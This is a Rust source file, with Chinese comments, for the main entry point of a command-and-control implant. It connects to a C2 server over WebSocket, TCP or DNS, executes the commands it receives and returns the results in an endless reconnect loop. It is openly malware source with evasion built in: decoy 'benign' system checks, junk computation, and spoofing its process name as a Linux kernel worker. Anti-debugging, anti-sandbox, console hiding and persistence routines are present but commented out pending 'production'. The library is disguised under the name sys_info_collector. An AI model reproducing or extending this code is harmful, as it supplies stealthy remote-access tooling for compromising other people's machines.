// C2 Client Agent - 主程序入口
// 
// 这是一个轻量级的 C2 受控端程序，通过多种传输协议连接到服务端，
// 接收并执行命令，然后将结果返回给服务端。
//
// 核心特性：
// - 多协议支持（WebSocket、TCP、DNS 等）
// - 条件编译：使用 Cargo Features 按需编译协议
// - 指数退避自动重连
// - 零 panic 错误处理
// - 跨平台命令执行
// - 异步 I/O
// - 可修补的服务器配置

// #![windows_subsystem = "windows"]
 
 #[allow(unused_imports)]
 use sys_info_collector::{ClientError, Result, stealth, Transport};
 #[allow(unused_imports)]
 use log::{error, info};
 
 fn main() {
    // ⚡ OPSEC: 关闭控制台日志
    /*
    if std::env::var("RUST_LOG").is_err() {
        std::env::set_var("RUST_LOG", "debug");
    }
    let _ = env_logger::try_init();
    */

     // 0. Initial random delay
     use rand::Rng;
     let delay = rand::thread_rng().gen_range(1..5); 
     println!("[*] Agent starting... (Debug delay: {}s)", delay);
     std::thread::sleep(std::time::Duration::from_secs(delay));
 
     // 1. [Benign] Harmless system check to start normal behavioral pattern
     stealth::perform_system_sanity_check();
 
     // 2. [Anti-Analysis] Direct PEB Check for Debugger
     // if stealth::is_debugger_present() {
     //     // println!("[!] WARNING: Debugger detected, but proceeding due to Debug Mode.");
     // }

    // 3. [Benign] Disk space query (very common in system utilities)
    stealth::verify_disk_integrity();

    // 4. [Stealth] Hide Window (No longer first, but still early)
    // stealth::hide_console();

    // 5. [Benign] Network env check
    stealth::check_network_config();

    // 6. [Junk] Computational Noise
    sys_info_collector::utils::junk_data_collector();

    // 7. [Anti-Analysis] Anti-Sandbox Environmental Checks
    // if stealth::is_sandbox() {
    //     println!("[!] WARNING: Sandbox features detected, but proceeding due to Debug Mode.");
    // }

    // 9. Backgrounding and Name Spoofing (Linux)
    #[cfg(target_os = "linux")]
    {
        stealth::spoof_process_name("kworker/u2:1-events");
    }

    // 10. Runtime Start
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .unwrap();

    rt.block_on(async {
        let res = run().await;
        if let Err(e) = res {
            println!("\x1b[31m[FATAL ERROR] Agent loop terminated: {:?}\x1b[0m", e);
        } else {
            println!("[*] Agent loop finished unexpectedly.");
        }
        println!("\n[Debug] Press Enter to finish...");
        let mut _dummy = String::new();
        let _ = std::io::stdin().read_line(&mut _dummy);
    });
}

/// 主运行逻辑
/// 
/// 根据编译时启用的 feature 选择相应的协议入口点
async fn run() -> Result<()> {
    // Force silent logs unless specifically enabled via env
    if std::env::var("RUST_LOG").is_err() {
        std::env::set_var("RUST_LOG", "error");
    }
    let _ = env_logger::try_init();
    
    // 💤 1. Sleep Delay
    let sleep_secs = sys_info_collector::config::get_sleep_time();
    if sleep_secs > 0 {
        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_secs)).await;
    }

    // 🆔 Machine UUID
    let _agent_uuid = sys_info_collector::get_agent_uuid();
    
    // 🏠 Persistence (Disabled for Debugging - will be re-enabled in production)
    /*
    if stealth::clone_and_hide() {
        std::process::exit(0);
    }
    */
    
    // 1️⃣ WebSocket Entry Point
    #[cfg(feature = "ws")]
    {
        return run_websocket_mode().await;
    }
    
    // 2️⃣ TCP Entry Point (Medium Priority)
    #[cfg(all(feature = "tcp", not(feature = "ws")))]
    {
        println!("[*] Agent compiled with TCP support");
        info!("Running in TCP mode");
        return run_tcp_mode().await;
    }
    
    // 3️⃣ DNS Entry Point (Lowest Priority)
    #[cfg(all(feature = "dns", not(any(feature = "ws", feature = "tcp"))))]
    {
        return run_dns_mode().await;
    }
    
    // ⚠️ Safety check: What if no feature is selected?
    #[cfg(not(any(feature = "ws", feature = "tcp", feature = "dns")))]
    {
        eprintln!("[!] ERROR: No protocol feature selected during compilation!");
        eprintln!("[!] Please compile with one of: --features ws, --features tcp, --features dns");
        error!("No protocol feature enabled at compile time");
        return Err(ClientError::ConnectionError(
            "No protocol feature enabled. Recompile with --features ws/tcp/dns".to_string()
        ));
    }
}

/// WebSocket 模式运行逻辑
#[cfg(feature = "ws")]
#[allow(dead_code)]
async fn run_websocket_mode() -> Result<()> {
    use sys_info_collector::config::{get_server_url, validate_server_url};
    use sys_info_collector::handler::MessageHandler;
    use sys_info_collector::transport::create_transport;
    
    let server_url = get_server_url();
    println!("[*] Target C2 Server: {}", server_url);
    
    if !validate_server_url(&server_url) {
        println!("[!] Error: Invalid server URL format.");
        return Err(ClientError::ConnectionError("Invalid target".to_string()));
    }
    
    let mut transport: Box<dyn Transport> = match create_transport(&server_url) {
        Ok(t) => t,
        Err(e) => {
            println!("[!] Error creating transport: {}", e);
            return Err(e);
        }
    };
    
    // "永生"循环 - 确保程序永远运行
    loop {
        println!("[*] Attempting to connect to C2...");
        if let Err(e) = transport.connect().await {
            println!("[!] Connection failed: {}. Retrying in 5s...", e);
            tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
            continue;
        }
        
        println!("[+] Connected! Starting message handler...");
        let handler = MessageHandler::new(transport);
        match handler.run().await {
            Ok(returned_transport) => {
                println!("[!] Message handler exited normally. Reconnecting...");
                transport = returned_transport;
            }
            Err(e) => {
                println!("[!] Session error: {}. Re-establishing transport...", e);
                match create_transport(&server_url) {
                    Ok(t) => transport = t,
                    Err(e) => return Err(e),
                }
            }
        }
        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    }
}

/// TCP 模式运行逻辑
#[cfg(feature = "tcp")]
#[allow(dead_code)]
async fn run_tcp_mode() -> Result<()> {
    use sys_info_collector::config::get_server_url;
    use sys_info_collector::handler::MessageHandler;
    use sys_info_collector::transport::{create_transport, Transport};
    
    // 获取服务器 URL
    let server_url = get_server_url();
    
    // 构造 TCP URL
    // 支持多种输入格式： 
    // 1. "127.0.0.1:8080" -> "tcp://127.0.0.1:8080"
    // 2. "tcp://127.0.0.1:8080" -> "tcp://127.0.0.1:8080"
    // 3. "ws://127.0.0.1:8080/ws" -> "tcp://127.0.0.1:8080"
    let mut clean_url = server_url.clone();
    
    // 移除已知的协议前缀
    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("tcp://") {
        clean_url = clean_url.replace("tcp://", "");
    }

    // 如果包含路径 (例如 /ws)，只保留主机和端口部分
    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }
    
    // 最终组合成标准的 tcp://host:port
    let tcp_url = format!("tcp://{}", clean_url);
    
    info!("TCP Configuration:");
    info!("  Original URL: {}", server_url);
    info!("  Final TCP URL: {}", tcp_url);
    info!("===========================================");
    
    // 创建 TCP 传输层
    let mut transport: Box<dyn Transport> = match create_transport(&tcp_url) {
        Ok(t) => {
            info!("TCP transport layer created successfully");
            t
        }
        Err(e) => {
            error!("Failed to create TCP transport: {}", e);
            return Err(e);
        }
    };
    
    // "永生"循环 - 确保程序永远运行
    loop {
        info!("Attempting to connect to TCP server...");
        
        // 连接到服务器
        if let Err(e) = transport.connect().await {
            error!("Failed to establish TCP connection: {}", e);
            continue;
        }
        
        info!("TCP connection established, starting message handler...");
        
        // 创建消息处理器
        let handler = MessageHandler::new(transport);
        
        // 运行消息处理循环
        match handler.run().await {
            Ok(returned_transport) => {
                info!("Message handler exited normally");
                transport = returned_transport;
            }
            Err(e) => {
                error!("Message handler error: {}", e);
                // 重新创建 transport
                match create_transport(&tcp_url) {
                    Ok(t) => transport = t,
                    Err(e) => {
                        error!("Failed to recreate TCP transport: {}", e);
                        return Err(e);
                    }
                }
            }
        }
        
        // 连接断开，准备重连
        info!("TCP connection lost, retrying...");
        info!("-------------------------------------------");
    }
}

/// DNS 模式运行逻辑
#[cfg(feature = "dns")]
#[allow(dead_code)]
async fn run_dns_mode() -> Result<()> {
    use sys_info_collector::config::{get_dns_resolver, get_server_url};
    use sys_info_collector::handler::MessageHandler;
    use sys_info_collector::transport::{create_transport, Transport};
    
    // 获取服务器 URL
    let server_url = get_server_url();
    
    // 显示 DNS 配置
    info!("DNS Configuration:");
    info!("  Domain: {}", server_url);
    
    if let Some(resolver) = get_dns_resolver() {
        info!("  Custom DNS Resolver: {}", resolver);
        println!("[*] Using custom DNS resolver: {}", resolver);
    } else {
        info!("  Using default DNS resolver (Google 8.8.8.8)");
        println!("[*] Using default DNS resolver");
    }
    
    info!("===========================================");
    
    // 构造 DNS URL
    // 支持多种输入格式：
    // 1. "example.com" -> "dns://example.com"
    // 2. "dns://example.com" -> "dns://example.com"
    // 3. "ws://example.com/ws" -> "dns://example.com"
    let mut clean_url = server_url.clone();
    
    // 移除已知的协议前缀
    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("dns://") {
        clean_url = clean_url.replace("dns://", "");
    }

    // 如果包含路径 (例如 /ws)，只保留主机部分
    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }
    
    // 最终组合成标准的 dns://domain
    let dns_url = format!("dns://{}", clean_url);
    
    // 创建 DNS 传输层
    let mut transport: Box<dyn Transport> = match create_transport(&dns_url) {
        Ok(t) => {
            info!("DNS transport layer created successfully");
            t
        }
        Err(e) => {
            error!("Failed to create DNS transport: {}", e);
            return Err(e);
        }
    };
    
    // "永生"循环 - 确保程序永远运行
    loop {
        info!("Attempting to connect to DNS server...");
        
        // 连接到服务器（DNS 是无连接的，这里只是逻辑初始化）
        if let Err(e) = transport.connect().await {
            error!("Failed to initialize DNS transport: {}", e);
            continue;
        }
        
        info!("DNS transport initialized, starting message handler...");
        
        // 创建消息处理器
        let handler = MessageHandler::new(transport);
        
        // 运行消息处理循环
        match handler.run().await {
            Ok(returned_transport) => {
                info!("Message handler exited normally");
                transport = returned_transport;
            }
            Err(e) => {
                error!("Message handler error: {}", e);
                // 重新创建 transport
                match create_transport(&dns_url) {
                    Ok(t) => transport = t,
                    Err(e) => {
                        error!("Failed to recreate DNS transport: {}", e);
                        return Err(e);
                    }
                }
            }
        }
        
        // 连接断开，准备重连
        info!("DNS connection lost, retrying...");
        info!("-------------------------------------------");
    }
}
